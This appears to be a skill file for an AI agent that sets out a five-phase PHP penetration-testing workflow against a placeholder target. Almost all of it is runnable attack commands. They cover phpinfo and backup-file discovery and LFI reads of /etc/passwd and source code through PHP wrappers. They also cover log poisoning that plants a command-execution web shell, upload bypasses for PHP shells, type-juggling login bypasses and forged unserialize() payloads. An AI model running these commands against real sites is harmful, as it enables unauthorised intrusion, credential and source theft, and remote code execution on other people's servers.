---
name: framework-php
description: "PHP security testing — LFI/RFI, file upload bypass, eval injection, type juggling loose comparison, phpinfo disclosure, PHP wrappers, log poisoning, deserialization via unserialize(). Triggers: 'php security', 'php pentest', 'php lfi', 'php rfi', 'php eval', 'php type juggling', 'phpinfo', 'php wrapper', 'php unserialize'."
---

# PHP Security Testing

PHP attack surface: LFI/RFI, type juggling, file upload, eval, wrappers, deserialization.

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

# Detect PHP
curl -sI "$TARGET" | grep -i "x-powered-by.*php\|set-cookie.*phpsessid"

# phpinfo exposure
for path in /phpinfo.php /info.php /test.php /php.php /phpi.php; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
  [ "$code" = "200" ] && echo "FOUND: $TARGET$path"
done | tee /workspace/output/phpinfo-discovery.txt

# Backup files
for f in index.php.bak index.php~ index.phps index.php.old config.php.bak; do
  curl -so /workspace/output/$f "$TARGET/$f" && echo "Downloaded: $f"
done
```

## Phase 2: LFI via PHP Wrappers

```bash
# Basic LFI test
for param in file page include view template load; do
  result=$(curl -s "$TARGET/?$param=../../../etc/passwd" | grep "root:")
  [ -n "$result" ] && echo "LFI via $param"
  
  # PHP wrapper — read source
  result=$(curl -s "$TARGET/?$param=php://filter/convert.base64-encode/resource=index" | grep -oP "[A-Za-z0-9+/]{40,}={0,2}" | head -1)
  [ -n "$result" ] && echo "PHP wrapper via $param: $result" | tee -a /workspace/output/lfi-results.txt
done

# Log poisoning (if LFI found)
curl -s "$TARGET" -A "<?php system(\$_GET['cmd']); ?>"
curl -s "$TARGET/?file=/var/log/apache2/access.log&cmd=id"
```

## Phase 3: File Upload Bypass

```bash
# Upload PHP shell with bypasses
UPLOAD_URL="$TARGET/upload"

# MIME type bypass
curl -s -X POST "$UPLOAD_URL" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  -F "submit=upload"

# Extension bypass
for ext in .php5 .phtml .pht .php3 .php4 .shtml .pHp .PHP; do
  curl -s -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/shell.php;filename=shell$ext;type=image/png"
done

# Double extension
curl -s -X POST "$UPLOAD_URL" -F "file=@/tmp/shell.jpg.php;type=image/jpeg"

# Null byte (older PHP)
curl -s -X POST "$UPLOAD_URL" -F "file=@/tmp/shell.php%00.jpg"
```

## Phase 4: Type Juggling

```bash
# PHP loose comparison (==) bypass
# MD5 collision: "0e..." strings compare as 0 in scientific notation
# md5("240610708") = "0e462097431906509019562988736854"
# md5("QNKCDZO") = "0e830400451993494058024219903391"

curl -s -X POST "$TARGET/login.php" -d "user=admin&pass=240610708"  # if md5(pass) == "0e..."

# JSON type confusion
curl -s -X POST "$TARGET/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":true}'

# Array bypass (strcmp returns 0 when comparing string to array)
curl -s "$TARGET/login.php?pass[]=anything"
```

## Phase 5: PHP Deserialization

```bash
# Identify unserialize() usage from source (if readable)
# Look for: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";i:1;}

# Generate PHP deserialization payload
python3 - <<'EOF'
payload = 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";i:1;}'
import base64
print(base64.b64encode(payload.encode()).decode())
EOF

# Test cookie/parameter deserialization
curl -s "$TARGET/profile.php" -b "user_data=PAYLOAD_BASE64"
curl -s "$TARGET/index.php?data=SERIALIZED_PAYLOAD"

# PHPGGC for gadget chains
# phpggc Monolog/RCE1 system id | base64
```

## Output

Save to `/workspace/output/`:
- `phpinfo-discovery.txt` — phpinfo file locations
- `lfi-results.txt` — LFI successful probes

## Next Phase

→ `vuln-path-traversal` for advanced LFI exploitation
→ `vuln-deserialization` for PHP unserialize gadget chains
